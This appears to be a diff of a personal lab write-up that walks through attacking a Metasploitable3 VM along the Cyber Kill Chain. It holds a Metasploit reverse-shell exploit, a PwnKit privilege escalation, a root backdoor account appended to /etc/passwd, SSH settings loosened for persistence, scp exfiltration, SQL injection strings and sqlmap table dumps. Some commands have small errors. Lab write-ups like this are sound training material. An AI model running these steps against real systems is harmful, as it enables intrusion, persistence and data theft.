@@ -6,12 +6,13 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
 
 ### Skills Learned
 
-- Gained a deeper understanding of nmap: Identified network ranges, open ports and services
+- Gained a deeper understanding of Nmap: Identified network ranges, open ports and services
 - Hands-on experience with identifying potential vulnerabilities and executing exploits
 - Learned techniques for escalating privileges on compromised systems
-- Furthered my experience in Metasploit executing exploits
-- Used John the Ripper for password cracking
+- Furthered my experience in Metasploit executing exploits and reverse-shells
+- Used John the Ripper, Hydra and Hashcat for password/hash cracking
 - Established reverse shells and executed commands on compromised systems including file manipulation
+- Used SSH to achieve persistent control of a target's system
 - Enhanced problem-solving abilities and research skills
 - Applied the Cyber Kill Chain to a real world scenario
 
@@ -23,6 +24,18 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
 - Metasploit Framework - An open-source penetration testing framework that helps find, exploit and validate vulnerabilities.
 - John the Ripper - A password cracking tool that supports various password hash types
 - Metasploitable3 - A virtual machine built with a large amount of security vulnerabilities
+- Hydra - A password cracking tool used for various services
+- Hashcat - A hashed passwords cracking tool that supports various hashes
+- SQLMap - An open-source penetration tool that automates the process of detecting and exploiting SQL injection flaws and enumerates data
+- Netcat - A network utility for reading from and writing to network connections using TCP and UDP
+
+### Proposed Hardening
+
+- Update and patch all software and services to mitigate known vulnerabilities
+- Access controls to restrict access to network scanning tools and monitor for unauthorized use
+- Vulnerability scan endpoints to identify and remediate current weaknesses
+- Encrypt data at rest and in transfit to promote confidentiality
+- Least privilege to o limit user access to only what is necessary 
   
 ## Steps
 
@@ -98,7 +111,8 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
 - To use the modcopy ProFTPD exploit, the following was used in Metasploit:
 
   ```bash
-  set rhosts 10.0.2.6 - to set target host
+  use exploit/unix/ftp/proftpd_modcopy_exec
+  set rhosts 10.0.2.6
   set sitepath /var/www/html
   set payload cmd/unix/reverse_perl
   set lhost 10.0.2.5
@@ -130,6 +144,7 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
   
 - The user account that was accessed did not have permissions to view the /etc/shadow file nor any sudo privileges after attempting 'sudo -l'
 - To discover which user is being used:
+  
   ```bash
   whoami
   ```
@@ -139,7 +154,7 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
-  - find / - starts the search for files and directores from the top of the directory and down
+  - find / - starts the search for files and directories from the top of the directory and down
   - -perm - specifies the search to files with specific permissions
   - -4000 - identifies files with the setuid bit set. (If a regular user executes the file, it runs with the privileges of the file's owner, often root. Helps to identify security flaws)
   - 2>/dev/null - redirects the the error messages to not display in the terminal
@@ -151,7 +166,7 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
 - Pkexec allows an authorized user to execute a program as another user, the version number was checked and identified as pkexec version 0.105
 - Exploit-DB was checked for exploits associated with pkexec version 0.105 and the following was found:
   - https://www.exploit-db.com/exploits/50011
-  - This exploit, identified as CVE-2021-3560, allows a local attacker to gain elevated privileges by creating a new user with administrative rights and settings its password
+  - This exploit, identified as CVE-2021-3560, allows a local attacker to gain elevated privileges by creating a new user with administrative rights and setting its password
 - To download the exploit directly into the target host:
 
   ```bash
@@ -167,37 +182,164 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
 
   ![pkexecdownload](https://github.com/user-attachments/assets/bf574cf4-09a3-4884-9c28-d1c10e7a087b)
 
-- To run the exploit, the permission had to be modified, however, the current user account wasn't able to
+- To run the exploit, I had to be in the /tmp directory and run:
+  
+  ```bash
+  ./PwnKit.sh"
+  ```
 
-  ![unsuccessfulpermission](https://github.com/user-attachments/assets/08887a1b-53f2-4790-8b71-e74f63a476d3)
+  ![pwnkit exploit](https://github.com/user-attachments/assets/f29688a9-1a02-4346-84e0-5514df0c43bf)
 
-- After an another unsuccessful attempt to access the /etc/shadow file, I started to research online and came across a potential security flaw with /etc/passwd.
-  Since the current user account had write permissions, I generated a hashed password with openssl on my host machine:
+- whoami? Root.
+- Now that I have root privileges, I wanted to add a new user with root privileges so that I can obtain persisent control and complete the command and control stage
+- I generated a hashed password with openssl on my host machine:
 
   ```bash
   openssl passwd -1 -salt xyz password
   ```
-
+  
 - On the target machine, in the reverse shell, I ran the following command to add a new user to /etc/passwd with root privileges
   ```bash
   
   echo 'hacker:$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
   ```
- ### Command and Control
- 
-- To switch to the new user:
-  
-  ```bash
-  su hacker
-  ```
-  
-  ![echo](https://github.com/user-attachments/assets/c6e5abd3-6961-4186-b1c8-ea55f192a02a)
-
-### Actions on Objectives
   
 - The newly created account was not only able to access the /etc/shadow file, but had root access to the entire system
 
   ![root access](https://github.com/user-attachments/assets/52210765-64ed-4c38-a8da-b9fe24a7b357)
+
+- Now it was time to setup SSH
+- I went into the /etc/ssh/sshd_config file to check if it was configured correctly
+- After opening the configuration file I noticed that PasswordAuthentication was commented out and used the following to uncomment it:
+
+  ```bash
+  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+  ```
+  
+  ![pwauth](https://github.com/user-attachments/assets/dddd36c1-d176-4b38-bcd5-5ce6b5151342)
+
+  ![pwauth2](https://github.com/user-attachments/assets/dff79ae1-e0a2-4c84-aa67-0256436cc054)
+
+- Once the configuration file was changed, I restarted the SSH service with:
+  ```bash
+  service ssh restart
+  ```
+
+- On my attacking machine, I ran:
+  ```bash
+  ssh hacker@10.0.2.6
+  ```
+
+- Permission Denied.
+- I continued to look at the sshd_config file and debated whether or not I had to add a public key to the system... and then I noticed
+- whoami? I am root
+- If you look at the screenshot below 'PermitRootLogin' is set to 'without-password' which means I would have to login with key authentication:
+
+  ![permitroot1](https://github.com/user-attachments/assets/09f301dd-bd77-4329-bef2-84f1bec61cf4)
+
+- I switched PermitRootLogin from without-password to yes which would allow me to login with a password:
+
+  ```bash
+  sed -i 's/^PermitRootLogin without-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+  ```
+
+  ![permitroot2](https://github.com/user-attachments/assets/a6a39404-662f-4df8-baa2-68217c55f128)
+
+
+### Command and Control
+ 
+- It was now time to achieve persistent control
+- I opened a terminal on my attacking host:
+
+  ```bash
+  ssh hacker@10.0.2.6
+  ```
+
+  ![ssh](https://github.com/user-attachments/assets/14e4c16e-d7ea-46c6-9bb1-37f6bb849d5a)
+
+
+### Actions on Objectives
+  
+- After gaining persistent control, I went into /var/www/html and deleted the .php file and the PwnKit exploit to minimize threat actor presence
+
+  ![php pwnkit del](https://github.com/user-attachments/assets/c5cc357a-0540-46b3-9a80-e1ff46dd01d1)
+
+- The investigation for confidential documents commenced
+- The first documents I found:
+
+  ![flag 1 p1](https://github.com/user-attachments/assets/b5260f8a-a7cf-4c63-b4f1-ab2763ed7926)
+
+- Once I found the first document, I used the secure copy protocol to transfer the document onto local host:
+  
+  ```bash
+  scp hacker@10.0.2.6:/lost+found/3_of_hearts.png /home/ant/Downloads/
+  ```
+
+  ![flag 1 p2](https://github.com/user-attachments/assets/9764f36f-e89a-4c9a-9cf7-374fae076d9b)
+
+  ![flag 1 p3](https://github.com/user-attachments/assets/d6348533-5861-4fa8-a4bd-58e747a24800)
+
+- Document number 2:
+  
+  ![chrome_C0q16Sqxf6](https://github.com/user-attachments/assets/3711ef59-ef84-42e2-8b7c-9dc902a452ff)
+
+  ![chrome_zP7yjo6Ozh](https://github.com/user-attachments/assets/4d98dc68-2f8e-4edf-93b9-d7baa3744341)
+
+- To find document 3, I used the 'find' command in the root directory / and * as a wildcard:
+
+  ```bash
+  find / -name *spades.png
+  ```
+  ![flag 3 p1](https://github.com/user-attachments/assets/46164cce-c843-4bda-8dca-2ef8d4a8d6a8)
+
+  ![flag 3 p2](https://github.com/user-attachments/assets/c32ae5fc-cfc0-4f8d-8fc6-935a61525894)
+
+  ![flag 3 p3](https://github.com/user-attachments/assets/fdae9604-da2b-4bd4-a2b9-462b6f80a981)
+
+### Additional Investigations
+
+- I wanted to dive deeper into this project to discover additional vulnerabilities for potential exploits and information gathering
+- After further investigation, I noticed the HTTP and MySQL servers were open
+- I went to the host's address 10.0.2.6 and discovered:
+  
+  ![HTTP Server](https://github.com/user-attachments/assets/2639ff29-4cff-48da-8a5a-0ee892aec7b7)
+
+- At first, I attempted some SQL Injections such as:
+  
+  ```sql
+  -- or # 
+  ' OR '1
+  ' OR 1 -- -
+  " OR "" = "
+  " OR 1 = 1 -- -
+  ' OR '' = '
+  ```
+
+- I noticed with a few injections, I was able to discover a few column names
+- To enumerate more information, I used SQLMap and ran the following command:
+  
+  ```bash
+  sqlmap -u http://10.0.2.6/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST --columns
+  ```
+
+  ![sqlmap1](https://github.com/user-attachments/assets/4cd656a1-2f63-4fc9-bfd4-ed1ee010f4fe)
+
+- The output:
+
+  ![sqlmap2](https://github.com/user-attachments/assets/013167d7-8fc6-4048-a3b5-f4c605e3a2f3)
+
+- Now that I knew the column names, I wanted to enumerate the actual information within the columns
+- In SQLMap, I ran:
+  
+  ```bash
+  sqlmap -u "http://10.0.2.6/payroll_app.php" --data="user=admin&password=admin&=OK" -p user --method POST payrol -T users --dump
+  ```
+
+  ![sqlpmap3](https://github.com/user-attachments/assets/3ef893b9-12a2-46cc-bbc2-aa43e797eba7)
+
+- The output was exactly what I have been looking for.. Chewbacca's password:
+
+  ![sqlmap4](https://github.com/user-attachments/assets/3ba2a9da-b1ec-42f0-8822-3c3b742c5170)
 
 
 
